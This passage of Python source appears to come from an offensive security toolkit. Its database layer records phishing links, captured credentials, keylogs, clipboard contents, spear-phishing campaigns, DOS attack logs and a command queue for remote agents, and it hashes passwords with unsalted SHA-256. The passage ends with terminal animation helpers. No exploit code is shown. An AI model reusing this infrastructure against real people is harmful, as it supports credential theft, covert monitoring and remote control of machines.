                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        """Log traffic generation"""
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def get_traffic_logs(self, limit: int = 50) -> List[Dict]:
        """Get traffic logs"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        """Log a Nikto scan"""
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log Nikto scan: {e}")
    
    def get_nikto_scans(self, limit: int = 20) -> List[Dict]:
        """Get Nikto scans"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        """Save a phishing link"""
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        """Get phishing links"""
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def increment_phishing_clicks(self, link_id: str) -> bool:
        """Increment phishing link clicks"""
        try:
            self.conn.execute(
                "UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?",
                (link_id,)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to increment phishing clicks: {e}")
            return False
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        """Save a captured credential"""
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        """Save a keylog entry"""
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        """Get keylogs"""
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get keylogs: {e}")
            return []
    
    def save_clipboard(self, content: str, source: str = "system"):
        """Save clipboard content"""
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        """Get clipboard history"""
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get clipboard history: {e}")
            return []
    
    def save_spear_phishing_campaign(self, campaign: 'SpearPhishingCampaign') -> bool:
        """Save a spear phishing campaign"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        """Get spear phishing campaigns"""
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get campaigns: {e}")
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        """Track email open"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        """Track email click"""
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        """Log a DOS attack"""
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        """Get DOS attacks"""
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get DOS attacks: {e}")
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        """Register an agent"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        """Update agent heartbeat"""
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        """Add a command for an agent"""
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        """Get pending commands for an agent"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get pending commands: {e}")
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        """Update agent command result"""
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        """Get all agents"""
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get agents: {e}")
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        """Get an agent"""
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get agent: {e}")
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        """Save a network packet"""
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        """Get network packets"""
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get network packets: {e}")
            return []
    
    def save_deployment(self, deployment: 'Deployment') -> bool:
        """Save a deployment"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        """Get deployments"""
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get deployments: {e}")
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        """Update deployment status"""
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update deployment: {e}")
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        """Save a Docker scan"""
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save Docker scan: {e}")
    
    def get_docker_scans(self, limit: int = 20) -> List[Dict]:
        """Get Docker scans"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM docker_scans ORDER BY timestamp DESC LIMIT ?", (limit,)
            ).fetchall()
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get Docker scans: {e}")
            return []
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        """Save a cracking job"""
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        """Update a cracking job"""
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        """Get cracking jobs"""
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get cracking jobs: {e}")
            return []
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        """Verify a user"""
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to verify user: {e}")
            return None
    
    def create_session(self, user_id: int) -> str:
        """Create a session"""
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        """Verify a session"""
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to verify session: {e}")
            return None
    
    def create_user(self, username: str, password: str, role: str = "user") -> bool:
        """Create a user"""
        try:
            import hashlib
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            self.conn.execute(
                "INSERT INTO users (username, password_hash, role) VALUES (?, ?, ?)",
                (username, password_hash, role)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to create user: {e}")
            return False
    
    def save_email(self, email_msg: 'EmailMessage') -> bool:
        """Save an email message"""
        try:
            self.conn.execute(
                """INSERT INTO email_messages 
                   (to_address, subject, body, from_address, html, attachments, status, sent_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (email_msg.to, email_msg.subject, email_msg.body, email_msg.from_email,
                 1 if email_msg.html else 0, json.dumps(email_msg.attachments),
                 email_msg.status, email_msg.sent_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save email: {e}")
            return False
    
    def get_emails(self, status: str = None, limit: int = 50) -> List[Dict]:
        """Get email messages"""
        try:
            if status:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages WHERE status = ? ORDER BY created_at DESC LIMIT ?",
                    (status, limit)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM email_messages ORDER BY created_at DESC LIMIT ?",
                    (limit,)
                )
            emails = []
            for row in rows:
                email = dict(row)
                email['attachments'] = json.loads(email['attachments']) if email['attachments'] else []
                emails.append(email)
            return emails
        except Exception as e:
            logger.error(f"Failed to get emails: {e}")
            return []
    
    def update_email_status(self, email_id: int, status: str):
        """Update email status"""
        try:
            self.conn.execute(
                "UPDATE email_messages SET status = ?, sent_at = CURRENT_TIMESTAMP WHERE id = ?",
                (status, email_id)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update email status: {e}")
    
    def delete_email(self, email_id: int) -> bool:
        """Delete an email"""
        try:
            self.conn.execute("DELETE FROM email_messages WHERE id = ?", (email_id,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to delete email: {e}")
            return False
    
    def save_pdf_report(self, report: 'PDFReport') -> bool:
        """Save a PDF report"""
        try:
            self.conn.execute(
                """INSERT INTO pdf_reports 
                   (title, target, analysis, file_path, status)
                   VALUES (?, ?, ?, ?, ?)""",
                (report.title, report.target, json.dumps(report.analysis),
                 report.file_path, report.status)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save PDF report: {e}")
            return False
    
    def get_pdf_reports(self, limit: int = 20) -> List[Dict]:
        """Get PDF reports"""
        try:
            rows = self.conn.execute(
                "SELECT * FROM pdf_reports ORDER BY created_at DESC LIMIT ?",
                (limit,)
            ).fetchall()
            reports = []
            for row in rows:
                report = dict(row)
                report['analysis'] = json.loads(report['analysis']) if report['analysis'] else {}
                reports.append(report)
            return reports
        except Exception as e:
            logger.error(f"Failed to get PDF reports: {e}")
            return []
    
    def add_threat_monitor(self, target: str, scan_type: str, interval: int = 300) -> bool:
        """Add a threat monitor"""
        try:
            next_scan = datetime.datetime.now() + datetime.timedelta(seconds=interval)
            self.conn.execute(
                """INSERT INTO threat_monitors (target, scan_type, interval, enabled, next_scan)
                   VALUES (?, ?, ?, 1, ?)""",
                (target, scan_type, interval, next_scan.isoformat())
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add threat monitor: {e}")
            return False
    
    def get_threat_monitors(self, enabled_only: bool = True) -> List[Dict]:
        """Get threat monitors"""
        try:
            if enabled_only:
                rows = self.conn.execute("SELECT * FROM threat_monitors WHERE enabled = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM threat_monitors ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get threat monitors: {e}")
            return []
    
    def update_threat_monitor_scan(self, monitor_id: int):
        """Update threat monitor last scan"""
        try:
            monitor = self.conn.execute(
                "SELECT interval FROM threat_monitors WHERE id = ?", (monitor_id,)
            ).fetchone()
            if monitor:
                next_scan = datetime.datetime.now() + datetime.timedelta(seconds=monitor['interval'])
                self.conn.execute(
                    "UPDATE threat_monitors SET last_scan = CURRENT_TIMESTAMP, next_scan = ? WHERE id = ?",
                    (next_scan.isoformat(), monitor_id)
                )
                self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update threat monitor: {e}")
    
    def log_threat_monitor_result(self, monitor_id: int, target: str, scan_type: str,
                                 threats_found: int, severity: str, output: str):
        """Log threat monitor result"""
        try:
            self.conn.execute(
                """INSERT INTO threat_monitor_results 
                   (monitor_id, target, scan_type, threats_found, severity, output)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (monitor_id, target, scan_type, threats_found, severity, output[:5000])
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat monitor result: {e}")
    
    def get_phishing_templates(self) -> List[Dict]:
        """Get phishing templates"""
        try:
            rows = self.conn.execute("SELECT * FROM phishing_templates ORDER BY name")
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def get_phishing_template(self, name: str) -> Optional[Dict]:
        """Get a phishing template"""
        try:
            row = self.conn.execute(
                "SELECT * FROM phishing_templates WHERE name = ?", (name,)
            ).fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get phishing template: {e}")
            return None
    
    def save_phishing_template(self, name: str, category: str, html_content: str) -> bool:
        """Save a phishing template"""
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO phishing_templates (name, category, html_content, updated_at)
                   VALUES (?, ?, ?, CURRENT_TIMESTAMP)""",
                (name, category, html_content)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save template: {e}")
            return False
    
    def delete_phishing_template(self, name: str) -> bool:
        """Delete a phishing template"""
        try:
            self.conn.execute("DELETE FROM phishing_templates WHERE name = ?", (name,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to delete template: {e}")
            return False
    
    def add_alert(self, alert_type: str, severity: str, message: str, source: str = None):
        """Add an alert"""
        try:
            self.conn.execute(
                "INSERT INTO alerts (alert_type, severity, message, source) VALUES (?, ?, ?, ?)",
                (alert_type, severity, message, source)
            )
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add alert: {e}")
    
    def get_alerts(self, limit: int = 50, unacknowledged_only: bool = False) -> List[Dict]:
        """Get alerts"""
        try:
            if unacknowledged_only:
                rows = self.conn.execute(
                    "SELECT * FROM alerts WHERE acknowledged = 0 ORDER BY timestamp DESC LIMIT ?",
                    (limit,)
                )
            else:
                rows = self.conn.execute(
                    "SELECT * FROM alerts ORDER BY timestamp DESC LIMIT ?",
                    (limit,)
                )
            return [dict(row) for row in rows]
        except Exception as e:
            logger.error(f"Failed to get alerts: {e}")
            return []
    
    def acknowledge_alert(self, alert_id: int) -> bool:
        """Acknowledge an alert"""
        try:
            self.conn.execute(
                "UPDATE alerts SET acknowledged = 1 WHERE id = ?",
                (alert_id,)
            )
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to acknowledge alert: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        """Get comprehensive statistics"""
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_arp_spoofs'] = self.conn.execute("SELECT COUNT(*) FROM arp_spoofing").fetchone()[0]
            stats['total_mac_entries'] = self.conn.execute("SELECT COUNT(*) FROM mac_info").fetchone()[0]
            stats['total_nat_entries'] = self.conn.execute("SELECT COUNT(*) FROM nat_info").fetchone()[0]
            stats['total_emails'] = self.conn.execute("SELECT COUNT(*) FROM email_messages").fetchone()[0]
            stats['total_pdf_reports'] = self.conn.execute("SELECT COUNT(*) FROM pdf_reports").fetchone()[0]
            stats['total_alerts'] = self.conn.execute("SELECT COUNT(*) FROM alerts").fetchone()[0]
            stats['unacknowledged_alerts'] = self.conn.execute("SELECT COUNT(*) FROM alerts WHERE acknowledged = 0").fetchone()[0]
            stats['total_monitors'] = self.conn.execute("SELECT COUNT(*) FROM threat_monitors WHERE enabled = 1").fetchone()[0]
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        return stats
    
    def close(self):
        """Close the database connection"""
        try:
            self.conn.close()
        except Exception as e:
            logger.error(f"Failed to close database: {e}")

# =====================
# TERMINAL ANIMATION ENGINE
# =====================
class TerminalAnimation:
    """Advanced terminal animation engine with multiple animation types"""
    
    @staticmethod
    def spinner(duration: float = 2.0, message: str = "Processing", style: str = "dots"):
        """Display a spinner animation"""
        spinner_chars = {
            'dots': ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
            'line': ['|', '/', '-', '\\'],
            'circle': ['◐', '◓', '◑', '◒'],
            'bounce': ['⠁', '⠂', '⠄', '⠂'],
            'pulse': ['█', '▓', '▒', '░', '▒', '▓'],
            'arrows': ['←', '↖', '↑', '↗', '→', '↘', '↓', '↙'],
            'blue_white': ['🔵', '⚪', '🔵', '⚪']
        }
        chars = spinner_chars.get(style, spinner_chars['dots'])
        start_time = time.time()
        i = 0
        while time.time() - start_time < duration:
            sys.stdout.write(f'\r{Colors.BLUE}{chars[i % len(chars)]} {message}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.08)
            i += 1
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def progress_bar(iterable, prefix: str = "Progress", length: int = 40, color: str = "BLUE"):
        """Display a progress bar with animation"""
        total = len(iterable)
        color_code = getattr(Colors, color, Colors.BLUE)
        for i, item in enumerate(iterable):
            progress = int(length * i / total)
            bar = '█' * progress + '░' * (length - progress)
            percent = int(100 * i / total)
            sys.stdout.write(f'\r{color_code}{prefix}: [{bar}] {percent}% ({i}/{total}){Colors.RESET}')
            sys.stdout.flush()
            yield item
        sys.stdout.write(f'\r{color_code}{prefix}: [{"█" * length}] 100% ({total}/{total}){Colors.RESET}\n')
        sys.stdout.flush()
    
    @staticmethod
    def typing_effect(text: str, delay: float = 0.04, color: str = "BLUE"):
        """Display text with typing effect"""
        color_code = getattr(Colors, color, Colors.BLUE)
        for char in text:
            sys.stdout.write(f'{color_code}{char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def matrix_rain(duration: float = 2.0, density: int = 10):
        """Display matrix rain animation with blue/white theme"""
        try:
            columns = shutil.get_terminal_size().columns
            chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F']
            start_time = time.time()
            while time.time() - start_time < duration:
                for _ in range(density):
                    row = ''.join(random.choice(chars) for _ in range(columns))
                    color = random.choice([Colors.BLUE, Colors.WHITE, Colors.LIGHTBLUE, Colors.LIGHTCYAN])
                    sys.stdout.write(f'\r{color}{row}{Colors.RESET}')
                    sys.stdout.flush()
                    time.sleep(0.03)
            sys.stdout.write('\r' + ' ' * columns + '\r')
            sys.stdout.flush()
        except:
            pass
    
    @staticmethod
    def pulse_animation(text: str, duration: float = 2.0, color: str = "BLUE"):
        """Display pulsing text animation"""
        color_code = getattr(Colors, color, Colors.BLUE)
        start_time = time.time()
        while time.time() - start_time < duration:
            for brightness in range(0, 100, 10):
                if brightness < 50:
                    style = Style.DIM
                else:
                    style = Style.BRIGHT
                sys.stdout.write(f'\r{color_code}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
            for brightness in range(100, 0, -10):
                if brightness > 50:
                    style = Style.BRIGHT
                else:
                    style = Style.DIM
                sys.stdout.write(f'\r{color_code}{style}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.03)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def wave_animation(text: str, duration: float = 2.0):
        """Display wave animation with blue/white theme"""
        start_time = time.time()
        colors = [Colors.BLUE, Colors.WHITE, Colors.LIGHTBLUE, Colors.LIGHTCYAN]
        while time.time() - start_time < duration:
            for i, color in enumerate(colors):
                prefix = ' ' * i
                sys.stdout.write(f'\r{color}{prefix}{text}{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.1)
        sys.stdout.write('\r' + ' ' * len(text) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def loading_bars(duration: float = 2.0, message: str = "Loading"):
        """Display loading bars animation"""
        start_time = time.time()
        while time.time() - start_time < duration:
            for i in range(1, 11):
                bar = '█' * i + '░' * (10 - i)
                sys.stdout.write(f'\r{Colors.BLUE}{message} [{bar}] {i*10}%{Colors.RESET}')
                sys.stdout.flush()
                time.sleep(0.05)
        sys.stdout.write('\r' + ' ' * (len(message) + 20) + '\r')
        sys.stdout.flush()
    
    @staticmethod
    def countdown(seconds: int, message: str = "Starting in"):
        """Display countdown animation"""
        for i in range(seconds, 0, -1):
            sys.stdout.write(f'\r{Colors.BLUE}{message} {i}...{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(1)
